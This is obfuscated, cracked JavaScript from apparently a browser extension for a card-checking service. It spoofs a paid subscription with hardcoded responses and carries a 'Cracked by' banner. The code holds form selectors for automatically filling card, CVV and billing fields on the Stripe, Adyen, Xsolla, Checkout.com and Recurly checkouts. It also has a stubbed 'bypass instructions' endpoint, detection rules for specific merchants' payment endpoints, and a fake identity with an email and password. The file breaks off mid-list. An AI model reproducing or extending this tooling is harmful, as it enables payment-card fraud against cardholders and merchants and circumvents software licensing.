import {
    getDeviceFingerprint as _0x52c14e
} from '../../crypto/device-fingerprint.js';
export const apiClient = new class {
    constructor() {
        this['baseUrl'] = 'https://zawkz.com', this['fingerprint'] = null, this['_initPromise'] = null, this['_sessionKey'] = null, this['_bearerToken'] = null;
    }
    async ['ensureInit']() {
        if (!this['fingerprint']) return this['_initPromise'] || (this['_initPromise'] = ((async () => {
            try {
                this['fingerprint'] = await _0x52c14e();
            } catch (_0x38f2a3) {
                throw this['_initPromise'] = null, _0x38f2a3;
            }
        })())), this['_initPromise'];
    } ['_getAuthHeaders']() {
        var _0x60df83 = {};
        _0x60df83['Content-Type'] = 'application/json', _0x60df83['X-Fingerprint'] = this['fingerprint'];
        const _0x2ecd2a = _0x60df83;
        return this['_bearerToken'] && (_0x2ecd2a['Authorization'] = 'Bearer\x20' + this['_bearerToken']), this['_sessionKey'] && (_0x2ecd2a['X-Encrypted'] = '1'), _0x2ecd2a;
    }
    async ['saveSessionToken'](_0x2bfe95) {
        if (_0x2bfe95) {
            this['_bearerToken'] = _0x2bfe95;
            try {
                var _0x7606c4 = {};
                _0x7606c4['extSessionToken'] = _0x2bfe95, await chrome['storage']['local']['set'](_0x7606c4);
            } catch {}
        }
    }
    async ['restoreSessionToken']() {
        try {
            const _0x250335 = await chrome['storage']['local']['get']('extSessionToken');
            if (_0x250335['extSessionToken']) return this['_bearerToken'] = _0x250335['extSessionToken'], !(0x31 * -0x49 + -0xa49 + 0x87 * 0x2e);
        } catch {}
        return !(-0x1f1d + 0x23 * -0x2f + -0x55d * -0x7);
    }
    async ['_get'](_0x37ed98, _0x391b79 = {}, _0x33fa81 = !(0xde6 * 0x1 + 0x2362 + -0x3147)) {
        await this['ensureInit'](), this['_sessionKey'] || await this['restoreSessionKey'](), await this['restoreSessionToken']();
        const _0x3c4155 = new URL('' + this['baseUrl'] + _0x37ed98);
        Object['entries'](_0x391b79)['forEach'](([_0x46c4b3, _0x14e781]) => {
            null != _0x14e781 && _0x3c4155['searchParams']['set'](_0x46c4b3, _0x14e781);
        });
        const _0x402f66 = await fetch(_0x3c4155['toString'](), {
            'headers': this['_getAuthHeaders']()
        });
        return this['_handleResponse'](_0x402f66, () => this['_get'](_0x37ed98, _0x391b79, !(0x3 * -0xd03 + 0xc38 + 0x55d * 0x5)), _0x33fa81);
    }
    async ['_post'](_0x9429fb, _0x141721 = {}, _0x23f358 = !(0x21b6 + -0x5b7 + -0x2 * 0xdff)) {
        await this['ensureInit'](), this['_sessionKey'] || await this['restoreSessionKey'](), await this['restoreSessionToken']();
        var _0x27c579 = {
            'fingerprint': this['fingerprint'],
            ..._0x141721
        };
        const _0x844d7c = _0x27c579;
        let _0x128f11;
        if (this['_sessionKey']) {
            const _0x1c7d3d = await this['_encryptAesGcm'](_0x844d7c);
            _0x128f11 = _0x1c7d3d ? JSON['stringify']({
                'encrypted': _0x1c7d3d
            }) : JSON['stringify'](_0x844d7c);
        } else _0x128f11 = JSON['stringify'](_0x844d7c);
        const _0x7e85e3 = await fetch('' + this['baseUrl'] + _0x9429fb, {
            'method': 'POST',
            'headers': this['_getAuthHeaders'](),
            'body': _0x128f11
        });
        return this['_handleResponse'](_0x7e85e3, () => this['_post'](_0x9429fb, _0x141721, !(0xf07 * 0x1 + -0x5d8 + -0x92f)), _0x23f358);
    }
    async ['_delete'](_0x1bbfac, _0x1a179a = !(0x1bf2 + 0x248d + -0x407e * 0x1)) {
        await this['ensureInit'](), this['_sessionKey'] || await this['restoreSessionKey'](), await this['restoreSessionToken']();
        const _0xee25e4 = await fetch('' + this['baseUrl'] + _0x1bbfac, {
            'method': 'DELETE',
            'headers': this['_getAuthHeaders'](),
            'body': JSON['stringify']({
                'fingerprint': this['fingerprint']
            })
        });
        return this['_handleResponse'](_0xee25e4, () => this['_delete'](_0x1bbfac, !(-0x137f + -0x726 + 0x1aa5)), _0x1a179a);
    }
    async ['_patch'](_0x4f928a, _0x331e18 = {}, _0x42dfe9 = !(0x55d * 0x2 + -0x1aea + 0x1031)) {
        await this['ensureInit'](), this['_sessionKey'] || await this['restoreSessionKey'](), await this['restoreSessionToken']();
        var _0x8af60d = {
            'fingerprint': this['fingerprint'],
            ..._0x331e18
        };
        const _0x1262fd = _0x8af60d;
        let _0x5e208a;
        if (this['_sessionKey']) {
            const _0x4591ee = await this['_encryptAesGcm'](_0x1262fd);
            _0x5e208a = _0x4591ee ? JSON['stringify']({
                'encrypted': _0x4591ee
            }) : JSON['stringify'](_0x1262fd);
        } else _0x5e208a = JSON['stringify'](_0x1262fd);
        const _0x59978b = await fetch('' + this['baseUrl'] + _0x4f928a, {
            'method': 'PATCH',
            'headers': this['_getAuthHeaders'](),
            'body': _0x5e208a
        });
        return this['_handleResponse'](_0x59978b, () => this['_patch'](_0x4f928a, _0x331e18, !(-0x173b + 0x235b + -0xc20)), _0x42dfe9);
    }
    async ['_handleResponse'](_0x520d15, _0xaaea04 = null, _0x2868fa = !(-0x1 * -0x1de1 + 0x11db + -0x2fbb * 0x1)) {
        if (!_0x520d15['ok']) {
            if (-0x919 + -0x10a9 + 0x1b6e === _0x520d15['status'] && _0xaaea04 && !_0x2868fa) try {
                const _0x52755f = await this['performKeyExchange']();
                if (_0x52755f?.['success']) return _0xaaea04();
            } catch (_0x21074b) {}
            try {
                const _0x49560d = await _0x520d15['json']();
                var _0x42110b = {};
                return _0x42110b['error'] = _0x49560d['error'] || _0x49560d['message'] || 'HTTP\x20' + _0x520d15['status'], _0x42110b['status'] = _0x520d15['status'], _0x42110b;
            } catch {
                var _0x30d051 = {};
                return _0x30d051['error'] = 'HTTP\x20' + _0x520d15['status'], _0x30d051['status'] = _0x520d15['status'], _0x30d051;
            }
        }
        try {
            const _0x4a16cc = await _0x520d15['json']();
            if (_0x4a16cc?.['encrypted'] && 'string' == typeof _0x4a16cc['encrypted']) {
                if (this['_sessionKey']) {
                    const _0x17593a = await this['_decryptAesGcm'](_0x4a16cc['encrypted']);
                    if (null !== _0x17593a) return _0x17593a;
                }
                if (_0xaaea04 && !_0x2868fa) try {
                    this['_sessionKey'] = null, await chrome['storage']['session']['remove']('ecdheSessionKey');
                    const _0x3f928f = await this['performKeyExchange']();
                    if (_0x3f928f?.['success']) return _0xaaea04();
                } catch (_0x4726e0) {}
                return _0x4a16cc;
            }
            return _0x4a16cc;
        } catch {
            var _0x459e3a = {};
            return _0x459e3a['error'] = 'Invalid\x20JSON', _0x459e3a;
        }
    }
    async ['performKeyExchange']() {
        await this['ensureInit']();
        try {
            var _0x500418 = {};
            _0x500418['name'] = 'ECDH', _0x500418['namedCurve'] = 'P-256';
            const _0x1720ad = await crypto['subtle']['generateKey'](_0x500418, !(0x1d3 + 0x733 + -0x906), ['deriveBits']),
                _0x59e0cf = await crypto['subtle']['exportKey']('raw', _0x1720ad['publicKey']),
                _0x4a0462 = this['_arrayBufferToBase64'](_0x59e0cf);
            const _0x294a0b = {
  "success": true,
  "data": {
    "serverPublicKey": "BFF4FJdZwySex/H+FC+AOnuIiDxRT+tZXWznGFP6DUqQYpzyAVCKEbnkTN9pMVPzDHErLXJx/XDCksKBnpSrBDM=",
    "sessionId": ""
  }
}
            var _0x108b4f = {};
            _0x108b4f['success'] = !(0x4 * -0x62b + 0xf9 * 0x2 + -0xfd * -0x17), _0x108b4f['error'] = 'No\x20server\x20public\x20key\x20in\x20response';
            if (!_0x294a0b?.['serverPublicKey']) return _0x108b4f;
            var _0x4acd1e = {};
            _0x4acd1e['name'] = 'ECDH', _0x4acd1e['namedCurve'] = 'P-256';
            var _0x36f984 = {};
            _0x36f984['name'] = 'HKDF';
            const _0x475696 = this['_base64ToArrayBuffer'](_0x294a0b['serverPublicKey']),
                _0x3b4aff = await crypto['subtle']['importKey']('raw', _0x475696, _0x4acd1e, !(0x241 * 0x3 + -0xa78 + -0xa * -0x5f), []),
                _0x5bb15d = await crypto['subtle']['deriveBits']({
                    'name': 'ECDH',
                    'public': _0x3b4aff
                }, _0x1720ad['privateKey'], -0xa * 0x296 + -0x948 + -0x303 * -0xc),
                _0x304163 = await crypto['subtle']['importKey']('raw', _0x5bb15d, _0x36f984, !(-0x1a0f + 0x845 + -0x1 * -0x11cb), ['deriveBits']),
                _0x26c501 = await crypto['subtle']['deriveBits']({
                    'name': 'HKDF',
                    'hash': 'SHA-256',
                    'salt': new Uint8Array(-0xff5 * 0x1 + 0x8 * 0xa6 + 0xae5),
                    'info': new TextEncoder()['encode']('jetix-v2.5-ecdhe-session-key')
                }, _0x304163, 0x6c6 + -0x3b0 * -0x8 + 0x2346 * -0x1);
            var _0x4ab522 = {};
            _0x4ab522['name'] = 'AES-GCM';
            var _0x228425 = {};
            return _0x228425['success'] = !(0x24ce * 0x1 + 0xf34 + -0xe * 0x3b7), _0x228425['sessionId'] = _0x294a0b['sessionId'], (this['_sessionKey'] = await crypto['subtle']['importKey']('raw', _0x26c501, _0x4ab522, !(0x5 * -0x209 + -0x36 * 0x7e + 0x2 * 0x1261), ['encrypt', 'decrypt']), await chrome['storage']['session']['set']({
                'ecdheSessionKey': this['_arrayBufferToBase64'](_0x26c501)
            }), _0x228425);
        } catch (_0x52ccab) {
            var _0xcce12e = {};
            return _0xcce12e['success'] = !(0x4 * -0x5d8 + -0x1d12 + 0x3473 * 0x1), _0xcce12e['error'] = _0x52ccab['message'], _0xcce12e;
        }
    }
    async ['restoreSessionKey']() {
        try {
            const _0x25e652 = await chrome['storage']['session']['get']('ecdheSessionKey');
            if (!_0x25e652['ecdheSessionKey']) return !(-0x3 * 0x41c + -0x4 * 0x5c9 + 0x2379);
            const _0x416fb0 = this['_base64ToArrayBuffer'](_0x25e652['ecdheSessionKey']);
            var _0x405949 = {};
            return _0x405949['name'] = 'AES-GCM', (this['_sessionKey'] = await crypto['subtle']['importKey']('raw', _0x416fb0, _0x405949, !(0x2578 + -0x260a + 0x93), ['encrypt', 'decrypt']), !(-0xb * 0xf4 + -0x215a + -0x2bd6 * -0x1));
        } catch {
            return !(-0x1 * 0x1f06 + 0xa51 + 0x14b6);
        }
    }
    async ['_encryptAesGcm'](_0x6e198d) {
        if (!this['_sessionKey']) return null;
        try {
            const _0x21f67f = 'object' == typeof _0x6e198d ? JSON['stringify'](_0x6e198d) : String(_0x6e198d),
                _0x2dfa57 = new TextEncoder()['encode'](_0x21f67f),
                _0x4b082f = crypto['getRandomValues'](new Uint8Array(-0x416 * -0x5 + 0x1f4f + -0x33b1)),
                _0x5f4f56 = await crypto['subtle']['encrypt']({
                    'name': 'AES-GCM',
                    'iv': _0x4b082f,
                    'tagLength': 0x80
                }, this['_sessionKey'], _0x2dfa57),
                _0x3e54b5 = new Uint8Array(_0x4b082f['byteLength'] + _0x5f4f56['byteLength']);
            return _0x3e54b5['set'](_0x4b082f), _0x3e54b5['set'](new Uint8Array(_0x5f4f56), _0x4b082f['byteLength']), this['_arrayBufferToBase64'](_0x3e54b5['buffer']);
        } catch {
            return null;
        }
    }
    async ['_decryptAesGcm'](_0x2a65f6) {
        if (!this['_sessionKey']) return null;
        try {
            const _0x3f6ae4 = this['_base64ToArrayBuffer'](_0x2a65f6),
                _0x610d19 = new Uint8Array(_0x3f6ae4),
                _0x4c5ce4 = _0x610d19['slice'](0x1 * -0x1ea8 + 0xc63 + -0x617 * -0x3, -0x1dc + 0x2f * 0x3b + 0x8ed * -0x1),
                _0x46d895 = _0x610d19['slice'](-0xf3a + 0x4be * -0x2 + 0x18c2),
                _0x316f2b = await crypto['subtle']['decrypt']({
                    'name': 'AES-GCM',
                    'iv': _0x4c5ce4,
                    'tagLength': 0x80
                }, this['_sessionKey'], _0x46d895),
                _0x5e2ca0 = new TextDecoder()['decode'](_0x316f2b);
            try {
                return JSON['parse'](_0x5e2ca0);
            } catch {
                return _0x5e2ca0;
            }
        } catch {
            return null;
        }
    } ['_arrayBufferToBase64'](_0x192b50) {
        const _0x41729d = new Uint8Array(_0x192b50);
        let _0x3bd2e5 = '';
        for (let _0x3ce502 = 0xca * 0x1c + 0x5 * -0x4a7 + -0x17 * -0xd; _0x3ce502 < _0x41729d['byteLength']; _0x3ce502++) _0x3bd2e5 += String['fromCharCode'](_0x41729d[_0x3ce502]);
        return btoa(_0x3bd2e5);
    } ['_base64ToArrayBuffer'](_0x412520) {
        const _0x1606eb = atob(_0x412520),
            _0x4d907f = new Uint8Array(_0x1606eb['length']);
        for (let _0x29e8d8 = -0x2ce * -0x2 + 0x53c * 0x2 + -0x1014; _0x29e8d8 < _0x1606eb['length']; _0x29e8d8++) _0x4d907f[_0x29e8d8] = _0x1606eb['charCodeAt'](_0x29e8d8);
        return _0x4d907f['buffer'];
    }
    async ['getBotUsername']() {
        return {
  "success": true,
  "data": {
    "username": "CHKerCCBot",
    "botId": "5929089968",
    "devLoginEnabled": false
  }
}
    }
    async ['verifySession']() {
        await this['ensureInit'](), await this['restoreSessionToken']();
        try {
            return {
                "success": true,
                "data": {
                    "valid": true,
                    "reason": "ok",
                    "user": {
                        "telegram_id": "8545551149",
                        "telegramId": "8545551149",
                        "name": "AWK",
                        "telegram_username": "zAWKz",
                        "username": "zAWKz",
                        "photo_url": null,
                        "photo_file_id": "",
                        "photoFileId": "",
                        "fingerprint": "",
                        "is_admin": false,
                        "is_banned": false,
                        "plan": "paid",
                        "effective_status": "active",
                        "days_left": 365,
                        "subscription_start": "2026-03-01 15:20:03",
                        "subscription_end": "2029-09-09T11:25:30.578Z",
                        "created_at": "2026-01-02 11:11:11",
                        "effective_tier": "STARTER",
                        "acquisition_source": "free",
                        "frontend_delay": 8000,
                        "daily_claim_amount": 10,
                        "total_charged": 0,
                        "total_ccn": 0,
                        "total_dead": 0,
                        "total_cards": 0
                    },
                    "coins": 10000,
                    "dailyClaimAvailable": false,
                    "dailyClaimAmount": 10,
                    "notificationCount": 24,
                    "announcement": "Cracked by @zAWKz!",
                    "formFillDefaults": {
                        "testCard": "4111111111111111",
                        "testExpiry": "12/28",
                        "testCvv": "123",
                        "fallbackEmail": "jetixautomation@gmail.com",
                        "fallbackName": "Jetix Automation",
                        "fallbackAddress": {
                            "street": "123 Main St",
                            "city": "New York",
                            "state": "NY",
                            "zip": "10001",
                            "country": "US"
                        }
                    },
                    "sessionToken": "",
                    "sessionExpiry": "2029-01-01T11:11:11.669Z"
                }
            }
        } catch (_0x5b9277) {
            var _0x2d3ba1 = {};
            return _0x2d3ba1['error'] = !(0xd0f * -0x2 + -0xd18 * 0x1 + 0x2736), _0x2d3ba1['type'] = 'NETWORK', _0x2d3ba1['message'] = 'Cannot\x20connect\x20to\x20server', _0x2d3ba1;
        }
    }
    async ['getAddress'](_0x56d7ef = 'US', _0x37a978 = !(0x6b8 + -0x3 * 0x793 + 0x2ab * 0x6)) {
        return {
  "success": true,
  "data": {
    "street": "V&A Waterfront",
    "city": "Cape Town",
    "state": "Western Cape",
    "stateName": "Western Cape",
    "zip": "8001",
    "postalCode": "8001",
    "country": "ZA",
    "countryCode": "ZA",
    "firstName": "Angelo",
    "lastName": "Graham",
    "email": "angelo.graham112@hotmail.com",
    "phone": "",
    "password": "31LgvwU6KGyN",
    "user": {
      "firstName": "Angelo",
      "lastName": "Graham",
      "email": "angelo.graham112@hotmail.com",
      "phone": "",
      "password": "31LgvwU6KGyN"
    }
  }
}
    }
    async ['getUser']() {
        return this['_get']('/api/data/user', {
            'fingerprint': this['fingerprint']
        });
    }
    async ['getSelectors'](domain, _0x2ec2be = !(-0x16e0 + -0x1 * 0x851 + 0x1f32)) {
        let data = {
            "success": true,
            "data": {
                "selectors": {
                    "cardNumber": "input[name=\"cardNumber\"], input[name=\"cardnumber\"], input[name=\"card-number\"], input[name=\"card_number\"], input[name=\"number\"], input[name=\"cc-number\"], input[id=\"Field-numberInput\"], input[id=\"cardNumber\"], input[id=\"card-number\"], input[autocomplete=\"cc-number\"], input[data-elements-stable-field-name=\"cardNumber\"], input[inputmode=\"numeric\"][aria-label*=\"card number\" i], .InputElement[name=\"cardnumber\"], .CardNumberField, .cc-number, #checkout-frames-card-number",
                    "expiry": "input[name=\"expiry\"], input[name=\"exp-date\"], input[name=\"cc-exp\"], input[name=\"card-expiry\"], input[name=\"card-expiry-date\"], input[id=\"expiry\"], input[id=\"cardExpiry\"], input[id=\"Field-expiryInput\"], input[autocomplete=\"cc-exp\"], input[data-elements-stable-field-name=\"cardExpiry\"], input[placeholder*=\"MM\" i][placeholder*=\"YY\" i], .ExpiryField, #checkout-frames-expiry-date",
                    "expMonth": "input[name=\"exp-month\"], input[name=\"cc-exp-month\"], input[name=\"card_month\"], select[name=\"exp-month\"], select[autocomplete=\"cc-exp-month\"]",
                    "expYear": "input[name=\"exp-year\"], input[name=\"cc-exp-year\"], input[name=\"card_year\"], select[name=\"exp-year\"], select[autocomplete=\"cc-exp-year\"]",
                    "cvv": "input[name=\"cvc\"], input[name=\"cvv\"], input[name=\"csc\"], input[name=\"security_code\"], input[name=\"securityCode\"], input[name=\"card-cvc\"], input[name=\"cc-csc\"], input[id=\"cvc\"], input[id=\"cardCvc\"], input[autocomplete=\"cc-csc\"], input[data-elements-stable-field-name=\"cardCvc\"], input[aria-label*=\"CVC\" i], input[aria-label*=\"CVV\" i], input[aria-label*=\"security code\" i], .CvcField",
                    "zip": "input[name=\"postalCode\"], input[name=\"postal_code\"], input[name=\"postal-code\"], input[name=\"zip\"], input[name=\"zipCode\"], input[name=\"zip_code\"], input[id=\"postalCode\"], input[id=\"zip\"], input[autocomplete=\"postal-code\"], .PostalCodeField",
                    "firstName": "input[name=\"firstName\"], input[name=\"first_name\"], input[name=\"first-name\"], input[name=\"fname\"], input[id=\"firstName\"], input[autocomplete=\"given-name\"], .FirstNameField",
                    "lastName": "input[name=\"lastName\"], input[name=\"last_name\"], input[name=\"last-name\"], input[name=\"lname\"], input[id=\"lastName\"], input[autocomplete=\"family-name\"], .LastNameField",
                    "name": "input[name=\"name\"], input[name=\"fullName\"], input[name=\"full_name\"], input[name=\"cardholder\"], input[name=\"card-holder\"], input[name=\"cardholderName\"], input[name=\"billingName\"], input[id=\"name\"], input[id=\"billingName\"], input[autocomplete=\"cc-name\"], input[autocomplete=\"name\"], input[placeholder*=\"cardholder\" i], input[placeholder*=\"full name\" i], input[placeholder*=\"name on card\" i], .BillingNameField",
                    "address": "input[name=\"addressLine1\"], input[name=\"address\"], input[name=\"address1\"], input[name=\"street\"], input[name=\"street-address\"], input[name=\"billing-address\"], input[id=\"addressLine1\"], input[id=\"address\"], input[autocomplete=\"address-line1\"], input[autocomplete=\"street-address\"], .AddressField",
                    "address2": "input[name=\"addressLine2\"], input[name=\"address2\"], input[name=\"apt\"], input[id=\"addressLine2\"], input[autocomplete=\"address-line2\"]",
                    "city": "input[name=\"city\"], input[name=\"locality\"], input[name=\"billing-city\"], input[id=\"city\"], input[autocomplete=\"address-level2\"], .CityField",
                    "state": "input[name=\"state\"], input[name=\"region\"], input[name=\"province\"], select[name=\"state\"], select[name=\"region\"], input[id=\"state\"], input[autocomplete=\"address-level1\"], select[autocomplete=\"address-level1\"], .StateField",
                    "country": "select[name=\"country\"], select[name=\"countryCode\"], select[name=\"billing-country\"], select[id=\"country\"], select[autocomplete=\"country\"], select[autocomplete=\"country-name\"]",
                    "phone": "input[name=\"phone\"], input[name=\"telephone\"], input[name=\"tel\"], input[name=\"mobile\"], input[name=\"billing-phone\"], input[id=\"phone\"], input[type=\"tel\"], input[autocomplete=\"tel\"], .PhoneField",
                    "email": "input[type=\"email\"], input[name=\"email\"], input[name=\"emailAddress\"], input[name=\"email_address\"], input[name=\"billing-email\"], input[id=\"email\"], input[autocomplete=\"email\"], input[placeholder*=\"email\" i], input[name=\"aPayment[strEmail]\"]"
                },
                "delays": {
                    "input": 50,
                    "submit": 1000
                }
            }
        };

        if (domain.includes('stripe')) {
            data = {
                "success": true,
                "data": {
                    "selectors": {
                        "cardRadio": "#payment-method-label-card, input[name=\"payment-method-accordion-item-title\"][value=\"card\"], .p-AccordionButton, button[aria-label=\"Pay with card\"], button[aria-label=\"Card\"]",
                        "cardHeader": "[data-testid=\"card-accordion-item-button\"], button.AccordionButton, .AccordionItemHeader, .p-AccordionButton, button[aria-label=\"Pay with card\"], button[aria-label=\"Card\"]",
                        "cardContainer": "[data-testid=\"card-accordion-item\"]",
                        "cardNumber": "input[name=\"cardNumber\"], input[id=\"cardNumber\"], input[name=\"cardnumber\"], input[name=\"number\"], input[id=\"Field-numberInput\"], input[autocomplete=\"cc-number\"], input[data-elements-stable-field-name=\"cardNumber\"], .InputElement[name=\"cardnumber\"], .CardNumberField, .p-CardNumberInput-input",
                        "expiry": "input[name=\"expiry\"], input[id=\"cardExpiry\"], input[name=\"exp-date\"], input[id=\"Field-expiryInput\"], input[autocomplete=\"cc-exp\"], input[data-elements-stable-field-name=\"cardExpiry\"], .InputElement[name=\"exp-date\"], .ExpiryField",
                        "cvv": "input[name=\"cvc\"], input[id=\"cardCvc\"], .CvcField, input[name=\"cvc\"]",
                        "name": "[name=\"billingName\"], [id=\"billingName\"], .BillingNameField",
                        "country": "select[name=\"billingCountry\"], select[id=\"billingCountry\"]",
                        "address": "[name=\"billingAddressLine1\"], [id=\"billingAddressLine1\"], input[autocomplete=\"address-line1\"], [id=\"Field-addressLine1Input\"]",
                        "address2": "[name=\"billingAddressLine2\"], [id=\"billingAddressLine2\"], [id=\"Field-addressLine2Input\"]",
                        "city": "[name=\"billingLocality\"], [id=\"billingLocality\"], input[name=\"city\"], input[autocomplete=\"address-level2\"]",
                        "state": "[name=\"billingAdministrativeArea\"], select[name=\"billingAdministrativeArea\"], [name=\"billingState\"], select[aria-label=\"State\"], select[aria-label=\"Prefecture\"]",
                        "zip": "[name=\"billingPostalCode\"], [name=\"postalCode\"], .PostalCodeField",
                        "phone": "[name=\"billingPhone\"], [id=\"billingPhone\"], input[type=\"tel\"], input[name=\"phone\"], input[autocomplete=\"tel\"]",
                        "email": "input[type=\"email\"], input[name=\"email\"], input[autocomplete=\"email\"]",
                        "stripePass": "input[name=\"enableStripePass\"]",
                        "terms": "input[name=\"termsOfServiceConsentCheckbox\"]"
                    },
                    "delays": {
                        "input": 50,
                        "submit": 1000
                    },
                    "uiInteraction": {
                        "frameDetection": [
                            ".PaymentMethodFormAccordionItem",
                            "#payment-method-label-card"
                        ],
                        "payWithoutLink": {
                            "buttonSelectors": [
                                "button.LinkCancelPartialLoginButton",
                                "button[class*='LinkCancelPartialLoginButton']"
                            ],
                            "buttonText": "pay without link",
                            "spanSelector": "span.LinkText"
                        },
                        "cardPaymentMethod": {
                            "openStates": [
                                "open"
                            ],
                            "openClasses": [
                                "AccordionItem--open",
                                "PaymentMethodFormAccordionItem--selected"
                            ],
                            "stateAttribute": "data-state"
                        },
                        "validation": {
                            "submitSelectors": [
                                "button[type='submit']",
                                ".SubmitButton",
                                "[data-testid='hosted-payment-submit-button']"
                            ]
                        }
                    },
                    "iframe": true
                }
            }
        }
        // Adyen
        if ([
                "adyen.com",
                "checkoutshopper-live.adyen.com",
                "checkoutshopper-test.adyen.com"
            ].includes(domain)) {
            data = {
                "success": true,
                "data": {
                    "selectors": {
                        "cardNumber": "input[data-fieldtype=\"encryptedCardNumber\"]",
                        "expiry": "input[data-fieldtype=\"encryptedExpiryDate\"]",
                        "cvv": "input[data-fieldtype=\"encryptedSecurityCode\"]",
                        "name": "input[name=\"holderName\"], input[id*=\"holderName\"], input.adyen-checkout__card__holderName__input, input[name=\"name\"][placeholder*=\"Name\"], input#card-holder"
                    },
                    "delays": {
                        "input": 50,
                        "submit": 1000
                    },
                    "iframe": true
                }
            }
        }

        // Xsolla
        if ([
                "secure.xsolla.com",
                "xsolla.com"
            ].includes(domain)) {
            data = {
                "success": true,
                "data": {
                    "selectors": {
                        "cardNumber": "#x-card-number-control-input-card_number, #x-text-control-input-card_number, input[name=\"card_number\"][autocomplete=\"cc-number\"], input.control-input__with-icon[name=\"card_number\"], input[name=\"card_number\"]",
                        "expMonth": "input[name=\"card_month\"][placeholder=\"MM\"], input[name=\"card_month\"][autocomplete=\"cc-exp-month\"]",
                        "expYear": "#x-text-control-input-card_year, input[name=\"card_year\"][autocomplete=\"cc-exp-year\"], input[name=\"card_year\"][placeholder=\"YY\"]",
                        "expiry": "#x-text-control-input-card_month[placeholder=\"MM/YY\"], input[name=\"card_month\"][placeholder=\"MM/YY\"], input[autocomplete=\"cc-exp\"], input[placeholder=\"MM/YY\"]",
                        "cvv": "#x-text-control-input-cvv, input[name=\"cvv\"][autocomplete=\"cc-csc\"], input.control-input__with-icon[name=\"cvv\"], input[name=\"cvv\"]",
                        "name": "#x-text-control-input-cardholdername, input[name=\"cardholdername\"], input[autocomplete=\"cc-name\"], #x-text-control-input-cpf_name, input[name=\"cpf_name\"]",
                        "address": "#x-text-control-input-street, input[name=\"street\"]",
                        "address2": "#x-text-control-input-street_number, input[name=\"street_number\"], #x-text-control-input-apt, input[name=\"apt\"]",
                        "city": "#x-text-control-input-city, input[name=\"city\"]",
                        "state": "button[name=\"state\"], select[name=\"state\"]",
                        "zip": "#x-text-control-input-zip, input[name=\"zip\"][autocomplete=\"postal-code\"], input.text-input[name=\"zip\"], input[name=\"zip\"]",
                        "phone": "#x-phone-control-input-phone, input[name=\"phone\"]",
                        "email": "#unit-v2-email-input, input[placeholder=\"Email address\"], input.control-input[type=\"email\"], input[type=\"email\"]"
                    },
                    "delays": {
                        "input": 50,
                        "submit": 1000
                    },
                    "iframe": true,
                    "separateExpiry": true
                }
            }
        }

        // Checkout.com
        if ([
                "api.checkout.com",
                "card-acquisition-gateway.checkout.com",
                "authentication-devices.checkout.com"
            ].includes(domain)) {
            data = {
                "success": true,
                "data": {
                    "selectors": {
                        "cardNumber": "input[name=\"card-number\"], input[id=\"card-number\"], .CardNumberField",
                        "expiry": "input[name=\"card-expiry-date\"], input[id=\"card-expiry-date\"], .ExpiryField",
                        "cvv": "input[name=\"card-cvv\"], input[id=\"card-cvv\"], .CvcField",
                        "name": "input[name=\"cardholder-name\"], input[id=\"cardholder-name\"], .CardHolderNameField"
                    },
                    "delays": {
                        "input": 50,
                        "submit": 1000
                    }
                }
            }
        }

        // Recurly
        if ([
                "api.recurly.com"
            ].includes(domain)) {
            data = {"success":true,"data":{"selectors":{"cardNumber":"#recurly-hosted-field-input[autocomplete='cc-number'], .recurly-hosted-field-input[autocomplete='cc-number'], input[autocomplete='cc-number']","cvv":"#recurly-hosted-field-input[autocomplete='cc-csc'], .recurly-hosted-field-input[autocomplete='cc-csc'], input[autocomplete='cc-csc']","name":"#input-card-name, .ams-input[id='input-card-name']","country":"select[data-recurly='country'], #select-country","state":"select[data-recurly='state'], #select-region","zip":"#input-postal-code, input[data-recurly='postal_code']","month":"select[style*='opacity: 0'][style*='appearance: none']","year":"select[style*='opacity: 0'][style*='appearance: none']:last-of-type"},"delays":{"input":50,"submit":1000},"iframe":true,"separateExpiry":true}}
        }

        return data
    }
    async ['submitStatus'](_0x410787) {
        // return this['_post']('/api/tracking/log', _0x410787);
    }
    async ['syncStats'](_0x2232dc) {
        // return this['_post']('/api/stats/sync', _0x2232dc);
    }
    async ['fetchInstructions'](_0x5e2037, _0xe7d2f5, _0x37ed8d, _0x2c2a47 = !(-0x74 * 0x3d + 0x53f + -0x1666 * -0x1)) {
    /*
        var _0x27538f = {};
        return _0x27538f['url'] = _0x5e2037, _0x27538f['method'] = _0xe7d2f5, _0x27538f['gateway'] = _0x37ed8d, _0x27538f['isCheckout'] = _0x2c2a47, this['_post']('/api/bypass/instructions', _0x27538f);
        */
    }
    async ['fetchSessionRules']() {
        return {
            "success": true,
            "data": {
                "rules": {
                    "version": "2.5.0",
                    "timestamp": 1778198500000,
                    "ttl": 1900000,
                    "user": {
                        "id": 1,
                        "plan": "paid",
                        "telegramId": "8545551149"
                    },
                    "gateways": {
                        "adyen": {
                            "id": "adyen",
                            "displayName": "Adyen",
                            "mode": "production",
                            "detection": {
                                "domains": [
                                    "adyen.com",
                                    "checkoutshopper-live.adyen.com",
                                    "checkoutshopper-test.adyen.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "binlookup",
                                    "setup",
                                    "analytics",
                                    "log",
                                    "fingerprint",
                                    "telemetry",
                                    "checkoutanalytics",
                                    "checkout.com",
                                    "google.com",
                                    "doubleclick.net",
                                    "facebook.com",
                                    "tiktok.com"
                                ],
                                "priority": 3,
                                "thirdPartySites": [{
                                        "id": "gog",
                                        "domains": [
                                            "api.gog.com"
                                        ],
                                        "endpointPatterns": [
                                            "/v1/checkout/",
                                            "/payment",
                                            "/order",
                                            "/purchase"
                                        ],
                                        "skipPatterns": [
                                            "/properties/",
                                            "/tokenize",
                                            "/users/",
                                            "/account/",
                                            "/stats",
                                            "/purchased-products",
                                            "/recommendations",
                                            "/wishlist"
                                        ]
                                    },
                                    {
                                        "id": "boosteroid",
                                        "domains": [
                                            "cloud.boosteroid.com"
                                        ],
                                        "endpointPatterns": [
                                            "/payments/adyen",
                                            "/payment/adyen",
                                            "/api/v2/payments/adyen"
                                        ],
                                        "skipPatterns": []
                                    },
                                    {
                                        "id": "instantGaming",
                                        "domains": [
                                            "www.instant-gaming.com"
                                        ],
                                        "endpointPatterns": [
                                            "/en/payment/",
                                            "/fr/payment/",
                                            "/de/payment/",
                                            "/es/payment/",
                                            "/it/payment/",
                                            "/pt/payment/",
                                            "/payment/"
                                        ],
                                        "skipPatterns": [
                                            "/ajax/",
                                            "/api/",
                                            "/cart/",
                                            "/user/"
                                        ]
                                    },
                                    {
                                        "id": "zee5",
                                        "domains": [
                                            "zpay-transformer.zee5.com"
                                        ],
                                        "endpointPatterns": [
                                            "/transformer/api/v1/payments"
                                        ],
                                        "skipPatterns": []
                                    },
                                    {
                                        "id": "mysteriumVpn",
